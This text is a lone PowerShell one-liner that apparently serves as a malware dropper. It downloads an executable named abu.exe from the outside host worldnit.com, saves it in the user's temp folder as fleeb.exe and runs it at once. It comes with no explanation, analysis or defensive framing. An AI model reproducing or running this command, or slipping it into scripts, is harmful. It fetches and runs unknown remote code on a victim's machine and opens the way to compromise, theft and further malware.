
($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/abu.exe', $deploylocation);Start-Process $deploylocation

